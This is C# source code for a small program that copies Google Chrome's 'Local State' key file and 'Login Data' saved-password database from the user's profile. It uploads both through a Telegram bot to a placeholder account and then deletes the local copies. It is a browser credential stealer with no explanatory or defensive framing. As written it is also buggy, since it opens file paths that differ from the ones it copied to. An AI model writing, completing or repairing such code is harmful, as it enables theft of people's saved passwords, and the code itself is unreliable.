using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Telegram.Bot;
using System.IO;
using Telegram.Bot.Types.InputFiles;

namespace teleuplo
{
    class Program
    {
        static async Task Main(string[] args)
        {
            var lca = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)+ @"\Google\Chrome\User Data\";
            File.Copy(lca + "Local State",@"D:\lca");
            File.Copy(lca + @"Default\Login Data", @"D:\lga");
            var botClient = new TelegramBotClient("Your Telegram Token");
            using (FileStream fs = System.IO.File.OpenRead(@"D:\local"))
            {
                InputOnlineFile inputOnlineFile = new InputOnlineFile(fs, "lca");
                await botClient.SendDocumentAsync("Your User Id", inputOnlineFile);
                File.Delete(@"D:\lca");
            }
            using (FileStream fs = System.IO.File.OpenRead(@"D:\login"))
            {
                InputOnlineFile inputOnlineFile = new InputOnlineFile(fs, "lga");
                await botClient.SendDocumentAsync("Your User Id", inputOnlineFile);
                File.Delete(@"D:\lga");
            }
        }
    }
}
